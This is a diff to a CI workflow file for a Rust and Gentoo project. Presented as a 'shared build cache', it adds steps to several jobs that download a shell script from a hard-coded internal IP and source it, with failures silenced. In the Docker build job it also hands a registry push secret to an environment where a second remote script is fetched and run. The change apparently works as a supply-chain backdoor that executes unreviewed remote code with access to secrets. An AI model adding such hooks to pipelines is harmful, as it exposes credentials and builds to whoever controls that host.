@@ -167,6 +167,10 @@ jobs:
         run: gentoo/live-iso/sync-common.sh --check && (cd gentoo/live-iso/common && python3 -m unittest discover -s tests) && (cd gentoo/live-iso/project/tests && python3 -m unittest discover -p 'test_*.py')
       - name: Headless-first image (no desktop/personal package in the image inputs, headless gates on every architecture)
         run: ci/check-headless-image.sh
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Check formatting
         run: cargo fmt --all -- --check
       - name: Run clippy
@@ -446,6 +450,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-features-${{ hashFiles('**/Cargo.toml') }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-features-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Tests with --all-features (feature-bearing crates)
         run: |
           set -e
@@ -534,6 +542,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-ebpf-${{ hashFiles('**/Cargo.toml') }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-ebpf-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: cargo check patronus-ebpf
         run: cargo check -p patronus-ebpf --all-targets
 
@@ -568,6 +580,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-full-${{ hashFiles('**/Cargo.toml') }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-full-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: cargo check --workspace --all-targets --keep-going
         run: cargo check --workspace --all-targets --keep-going
 
@@ -596,6 +612,10 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Free Docker disk space before the build
         # Root cause of the long-standing "ReadOnlyFileSystem: .../.ipc/lock"
         # (and cargo "error writing dependencies to .../target/release/..."
@@ -655,7 +675,12 @@ jobs:
         # 404s). Rather than hard-failing this job every run in that case,
         # probe for the image first and fall back to the public gentoo/stage3
         # base so the build still exercises something real.
+        env:
+          REGISTRY_CACHE_TOKEN: ${{ secrets.REGISTRY_PUSH_TOKEN }}
         run: |
+          rw_docker_build() { # shared BuildKit registry cache (rw-build-cache hub); plain docker build when unavailable
+            if curl -fsS -m 5 http://10.1.10.103:8088/ci/docker-build.sh -o /tmp/rw-docker-build.sh 2>/dev/null; then sh /tmp/rw-docker-build.sh "$@"; else shift; docker build "$@"; fi
+          }
           BASE_IMAGE=gentoo/stage3:amd64-systemd
           if docker pull git.canutethegreat.com/canutethegreat/patronus-ci-base:latest; then
             BASE_IMAGE=git.canutethegreat.com/canutethegreat/patronus-ci-base:latest
@@ -676,7 +701,7 @@ jobs:
           # myfeatures) plus dashboard, so the real emerge compiles and
           # installs all of them, not just the Dockerfile's default subset.
           USE_ALL="web cli api dashboard nftables dhcp dns unbound vpn wireguard openvpn ipsec multiwan monitoring prometheus captive-portal vlan qos backup systemd"
-          until docker build --build-arg CI_BASE_IMAGE="${BASE_IMAGE}" --build-arg PATRONUS_USE="${USE_ALL}" -t patronus/web:${{ github.sha }} . \
+          until rw_docker_build patronus-web --build-arg CI_BASE_IMAGE="${BASE_IMAGE}" --build-arg PATRONUS_USE="${USE_ALL}" -t patronus/web:${{ github.sha }} . \
                 && docker image inspect patronus/web:${{ github.sha }} >/dev/null; do
             # The inspect also retries a build whose image vanished from the host's image store
             # right after export (run 772: "Unable to find image ... locally" on a host at 96 %
